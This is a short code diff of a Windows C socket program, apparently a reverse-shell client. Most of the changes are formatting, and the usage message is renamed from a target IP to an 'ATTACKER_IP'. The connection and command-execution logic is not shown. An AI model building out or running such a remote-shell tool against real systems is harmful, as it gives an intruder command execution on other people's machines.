@@ -4,9 +4,11 @@
 #include <WS2tcpip.h>
 #pragma comment(lib, "Ws2_32.lib");
 
-int main(int argc, char* argv[]) {
+
+int main(int argc, char* argv[])
+{
     if (argc != 2) {
-        printf("Usage: %s <TARGET_IP>\n", argv[0]);
+        printf("Usage: %s <ATTACKER_IP>\n", argv[0]);
         return 1;
     }
 
@@ -45,6 +47,7 @@ int main(int argc, char* argv[]) {
         CloseHandle(pi.hThread);
         memset(RecvServer, 0, sizeof(RecvServer));
     }
-
     return 0;
 }
+
+
